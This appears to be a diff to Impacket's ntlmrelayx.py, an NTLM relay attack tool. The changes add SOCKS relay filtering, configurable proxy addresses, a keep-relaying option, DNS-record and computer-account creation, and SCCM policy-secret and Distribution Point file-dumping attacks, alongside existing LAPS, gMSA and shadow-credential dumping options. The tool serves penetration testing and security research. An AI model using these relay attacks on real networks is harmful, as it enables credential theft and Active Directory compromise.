@@ -1,7 +1,9 @@
 #!/usr/bin/env python
 # Impacket - Collection of Python classes for working with network protocols.
 #
-# Copyright (C) 2022 Fortra. All rights reserved.
+# Copyright Fortra, LLC and its affiliated companies 
+#
+# All rights reserved.
 #
 # This software is provided under a slightly modified version
 # of the Apache Software License. See the accompanying LICENSE file
@@ -42,6 +44,7 @@ try:
     from urllib.request import ProxyHandler, build_opener, Request
 except ImportError:
     from urllib2 import ProxyHandler, build_opener, Request
+from urllib.parse import urlparse
 
 import json
 from time import sleep
@@ -57,10 +60,11 @@ from impacket.examples.ntlmrelayx.servers.socksserver import SOCKS
 RELAY_SERVERS = []
 
 class MiniShell(cmd.Cmd):
-    def __init__(self, relayConfig, threads):
+    def __init__(self, relayConfig, threads, api_address):
         cmd.Cmd.__init__(self)
 
         self.prompt = 'ntlmrelayx> '
+        self.api_address = api_address
         self.tid = None
         self.relayConfig = relayConfig
         self.intro = 'Type help for list of commands'
@@ -98,8 +102,17 @@ class MiniShell(cmd.Cmd):
         return
 
     def do_socks(self, line):
+        '''Filter are available :
+ type : socks <filter> <value>
+ filters : target, username, admin 
+ values : 
+   - target : IP or FQDN
+   - username : domain/username
+   - admin : true or false 
+        '''
+
         headers = ["Protocol", "Target", "Username", "AdminStatus", "Port"]
-        url = "http://localhost:9090/ntlmrelayx/api/v1.0/relays"
+        url = "http://{}/ntlmrelayx/api/v1.0/relays".format(self.api_address)
         try:
             proxy_handler = ProxyHandler({})
             opener = build_opener(proxy_handler)
@@ -111,7 +124,30 @@ class MiniShell(cmd.Cmd):
             logging.error("ERROR: %s" % str(e))
         else:
             if len(items) > 0:
-                self.printTable(items, header=headers)
+                if("=" in line and len(line.replace('socks','').split('='))==2):
+                    _filter=line.replace('socks','').split('=')[0]
+                    _value=line.replace('socks','').split('=')[1]
+                    if(_filter=='target'):
+                        _filter=1
+                    elif(_filter=='username'):
+                        _filter=2
+                    elif(_filter=='admin'):
+                        _filter=3
+                    else:
+                        logging.info('Expect : target / username / admin = value')                    
+                    _items=[]
+                    for i in items:
+                        if(_value.lower() in i[_filter].lower()):
+                            _items.append(i)
+                    if(len(_items)>0):
+                        self.printTable(_items,header=headers)
+                    else:
+                        logging.info('No relay matching filter available!')
+
+                elif("=" in line):
+                    logging.info('Expect target/username/admin = value')
+                else:
+                    self.printTable(items, header=headers)
             else:
                 logging.info('No Relays Available!')
 
@@ -148,13 +184,15 @@ def start_servers(options, threads):
         c.setExeFile(options.e)
         c.setCommand(options.c)
         c.setEnumLocalAdmins(options.enum_local_admins)
+        c.setAddComputerSMB(options.add_computer)
         c.setDisableMulti(options.no_multirelay)
+        c.setKeepRelaying(options.keep_relaying)
         c.setEncoding(codec)
         c.setMode(mode)
         c.setAttacks(PROTOCOL_ATTACKS)
         c.setLootdir(options.lootdir)
         c.setOutputFile(options.output_file)
-        c.setLDAPOptions(options.no_dump, options.no_da, options.no_acl, options.no_validate_privs, options.escalate_user, options.add_computer, options.delegate_access, options.dump_laps, options.dump_gmsa, options.dump_adcs, options.sid)
+        c.setLDAPOptions(options.no_dump, options.no_da, options.no_acl, options.no_validate_privs, options.escalate_user, options.add_computer, options.delegate_access, options.dump_laps, options.dump_gmsa, options.dump_adcs, options.sid, options.add_dns_record)
         c.setRPCOptions(options.rpc_mode, options.rpc_use_smb, options.auth_smb, options.hashes_smb, options.rpc_smb_port)
         c.setMSSQLOptions(options.query)
         c.setInteractive(options.interactive)
@@ -171,7 +209,11 @@ def start_servers(options, threads):
         c.setIsShadowCredentialsAttack(options.shadow_credentials)
         c.setShadowCredentialsOptions(options.shadow_target, options.pfx_password, options.export_type,
                                       options.cert_outfile_path)
-
+        c.setIsSCCMPoliciesAttack(options.sccm_policies)
+        c.setIsSCCMDPAttack(options.sccm_dp)
+        c.setSCCMPoliciesOptions(options.sccm_policies_clientname, options.sccm_policies_sleep)
+        c.setSCCMDPOptions(options.sccm_dp_extensions, options.sccm_dp_files)
+        
         c.setAltName(options.altname)
 
         #If the redirect option is set, configure the HTTP server to redirect targets to SMB
@@ -237,7 +279,7 @@ if __name__ == '__main__':
                                                                              'full URL, one per line')
     parser.add_argument('-w', action='store_true', help='Watch the target file for changes and update target list '
                                                         'automatically (only valid with -tf)')
-    parser.add_argument('-i','--interactive', action='store_true',help='Launch an smbclient or LDAP console instead'
+    parser.add_argument('-i','--interactive', action='store_true',help='Launch an smbclient, LDAP console or SQL shell instead'
                         'of executing a command after a successful relay. This console will listen locally on a '
                         ' tcp port and can be reached with for example netcat.')
 
@@ -257,6 +299,7 @@ if __name__ == '__main__':
     parser.add_argument('--raw-port', type=int, help='Port to listen on raw server', default=6666)
 
     parser.add_argument('--no-multirelay', action="store_true", required=False, help='If set, disable multi-host relay (SMB and HTTP servers)')
+    parser.add_argument('--keep-relaying', action="store_true", required=False, help='If set, keeps relaying to a target even after a successful connection on it')
     parser.add_argument('-ra','--random', action='store_true', help='Randomize target selection')
     parser.add_argument('-r', action='store', metavar = 'SMBSERVER', help='Redirect HTTP requests to a file:// path on SMBSERVER')
     parser.add_argument('-l','--lootdir', action='store', type=str, required=False, metavar = 'LOOTDIR',default='.', help='Loot '
@@ -273,6 +316,9 @@ if __name__ == '__main__':
                                                                              'SMB Server (16 hex bytes long. eg: 1122334455667788)')
     parser.add_argument('-socks', action='store_true', default=False,
                         help='Launch a SOCKS proxy for the connection relayed')
+    parser.add_argument('-socks-address', default='127.0.0.1', help='SOCKS5 server address (also used for HTTP API)')
+    parser.add_argument('-socks-port', default=1080, type=int, help='SOCKS5 server port')
+    parser.add_argument('-http-api-port', default=9090, type=int, help='SOCKS5 HTTP API port')
     parser.add_argument('-wh','--wpad-host', action='store',help='Enable serving a WPAD file for Proxy Authentication attack, '
                                                                    'setting the proxy host to the one supplied.')
     parser.add_argument('-wa','--wpad-auth-num', action='store', type=int, default=1, help='Prompt for authentication N times for clients without MS16-077 installed '
@@ -290,7 +336,7 @@ if __name__ == '__main__':
     smboptions.add_argument('-e', action='store', required=False, metavar = 'FILE', help='File to execute on the target system. '
                                      'If not specified, hashes will be dumped (secretsdump.py must be in the same directory)')
     smboptions.add_argument('--enum-local-admins', action='store_true', required=False, help='If relayed user is not admin, attempt SAMR lookup to see who is (only works pre Win 10 Anniversary)')
-
+    
     #RPC arguments
     rpcoptions = parser.add_argument_group("RPC client options")
     rpcoptions.add_argument('-rpc-mode', choices=["TSCH"], default="TSCH", help='Protocol to attack, only TSCH supported')
@@ -323,12 +369,17 @@ if __name__ == '__main__':
     ldapoptions.add_argument('--no-acl', action='store_false', required=False, help='Disable ACL attacks')
     ldapoptions.add_argument('--no-validate-privs', action='store_false', required=False, help='Do not attempt to enumerate privileges, assume permissions are granted to escalate a user via ACL attacks')
     ldapoptions.add_argument('--escalate-user', action='store', required=False, help='Escalate privileges of this user instead of creating a new one')
-    ldapoptions.add_argument('--add-computer', action='store', metavar=('COMPUTERNAME', 'PASSWORD'), required=False, nargs='*', help='Attempt to add a new computer account')
     ldapoptions.add_argument('--delegate-access', action='store_true', required=False, help='Delegate access on relayed computer account to the specified account')
     ldapoptions.add_argument('--sid', action='store_true', required=False, help='Use a SID to delegate access rather than an account name')
     ldapoptions.add_argument('--dump-laps', action='store_true', required=False, help='Attempt to dump any LAPS passwords readable by the user')
     ldapoptions.add_argument('--dump-gmsa', action='store_true', required=False, help='Attempt to dump any gMSA passwords readable by the user')
     ldapoptions.add_argument('--dump-adcs', action='store_true', required=False, help='Attempt to dump ADCS enrollment services and certificate templates info')
+    ldapoptions.add_argument('--add-dns-record', nargs=2, action='store', metavar=('NAME', 'IPADDR'), required=False, help='Add the <NAME> record to DNS via LDAP pointing to <IPADDR>')
+
+    #Common options for SMB and LDAP
+    commonoptions = parser.add_argument_group("Common options for SMB and LDAP")
+    commonoptions.add_argument('--add-computer', action='store', metavar=('COMPUTERNAME', 'PASSWORD'), required=False, nargs='*', help='Attempt to add a new computer account via SMB or LDAP, depending on the specified target. '
+        'This argument can be used either with the LDAP or the SMB service, as long as the target is a domain controller.')
 
     #IMAP options
     imapoptions = parser.add_argument_group("IMAP client options")
@@ -357,6 +408,17 @@ if __name__ == '__main__':
                                    help='choose to export cert+private key in PEM or PFX (i.e. #PKCS12) (default: PFX))')
     shadowcredentials.add_argument('--cert-outfile-path', action='store', required=False, help='filename to store the generated self-signed PEM or PFX certificate and key')
 
+    # SCCM policies options
+    sccmpoliciesoptions = parser.add_argument_group("SCCM Policies attack options")
+    sccmpoliciesoptions.add_argument('--sccm-policies', action='store_true', required=False, help='Enable SCCM policies attack. Performs SCCM secret policies dump from a Management Point by registering a device. Works best when relaying a machine account. Expects as target \'http://<MP>/ccm_system_windowsauth/request\'')
+    sccmpoliciesoptions.add_argument('--sccm-policies-clientname', action='store', required=False, help='The name of the client that will be registered in order to dump secret policies. Defaults to the relayed account\'s name')
+    sccmpoliciesoptions.add_argument('--sccm-policies-sleep', action='store', required=False, help='The number of seconds to sleep after the client registration before requesting secret policies')
+
+    sccmdpoptions = parser.add_argument_group("SCCM Distribution Point attack options")
+    sccmdpoptions.add_argument('--sccm-dp', action='store_true', required=False, help='Enable SCCM Distribution Point attack. Perform package file dump from an SCCM Distribution Point. Expects as target \'http://<DP>/sms_dp_smspkg$/Datalib\'')
+    sccmdpoptions.add_argument('--sccm-dp-extensions', action='store', required=False, help='A custom list of extensions to look for when downloading files from the SCCM Distribution Point. If not provided, defaults to .ps1,.bat,.xml,.txt,.pfx')
+    sccmdpoptions.add_argument('--sccm-dp-files', action='store', required=False, help='The path to a file containing a list of specific URLs to download from the Distribution Point, instead of downloading by extensions. Providing this argument will skip file indexing')
+
     try:
        options = parser.parse_args()
     except Exception as e:
@@ -366,6 +428,18 @@ if __name__ == '__main__':
     if options.rpc_use_smb and not options.auth_smb:
        logging.error("Set -auth-smb to relay DCE/RPC to SMB pipes")
        sys.exit(1)
+    
+    # Ensuring the correct target is set when performing SCCM policies attack
+    if options.sccm_policies is True and not options.target.rstrip('/').endswith("/ccm_system_windowsauth/request"):
+        logging.error("When performing SCCM policies attack, the Management Point authenticated device registration endpoint should be provided as target")
+        logging.error(f"For instance: {urlparse(options.target).scheme}://{urlparse(options.target).netloc}/ccm_system_windowsauth/request")
+        sys.exit(1)
+
+    # Ensuring the correct target is set when performing SCCM DP attack
+    if options.sccm_dp is True and not options.target.rstrip('/').endswith("/sms_dp_smspkg$/Datalib"):
+        logging.error("When performing SCCM DP attack, the Distribution Point Datalib endpoint should be provided as target")
+        logging.error(f"For instance: {urlparse(options.target).scheme}://{urlparse(options.target).netloc}/sms_dp_smspkg$/Datalib")
+        sys.exit(1)
 
     # Init the example's logger theme
     logger.init(options.ts)
@@ -383,6 +457,10 @@ if __name__ == '__main__':
     from impacket.examples.ntlmrelayx.clients import PROTOCOL_CLIENTS
     from impacket.examples.ntlmrelayx.attacks import PROTOCOL_ATTACKS
 
+    if options.add_dns_record:
+        dns_name = options.add_dns_record[0].lower()
+        if dns_name == 'wpad' or dns_name == '*':
+            logging.warning('You are asking to add a `wpad` or a wildcard DNS name. This can cause disruption in larger networks (using multiple DNS subdomains) or if workstations already use a proxy config.')
 
     if options.codec is not None:
         codec = options.codec
@@ -399,6 +477,9 @@ if __name__ == '__main__':
     else:
         if options.tf is not None:
             #Targetfile specified
+            if (options.add_computer):
+                logging.info("To add a machine account through SMB only the Domain Controller must be specified as target")
+                sys.exit(1)
             logging.info("Running in relay mode to hosts in targetfile")
             targetSystem = TargetsProcessor(targetListFile=options.tf, protocolClients=PROTOCOL_CLIENTS, randomize=options.random)
             mode = 'RELAY'
@@ -434,8 +515,9 @@ if __name__ == '__main__':
     threads = set()
     socksServer = None
     if options.socks is True:
+
         # Start a SOCKS proxy in the background
-        socksServer = SOCKS()
+        socksServer = SOCKS(server_address=(options.socks_address, options.socks_port), api_port=options.http_api_port)
         socksServer.daemon_threads = True
         socks_thread = Thread(target=socksServer.serve_forever)
         socks_thread.daemon = True
@@ -444,11 +526,17 @@ if __name__ == '__main__':
 
     c = start_servers(options, threads)
 
+    # Log multirelay flag status
+    if options.no_multirelay:
+        logging.info("Multirelay disabled")
+    else:
+        logging.info("Multirelay enabled")
+
     print("")
     logging.info("Servers started, waiting for connections")
     try:
         if options.socks:
-            shell = MiniShell(c, threads)
+            shell = MiniShell(c, threads, api_address='{}:{}'.format(options.socks_address, options.http_api_port))
             shell.cmdloop()
         else:
             sys.stdin.read()
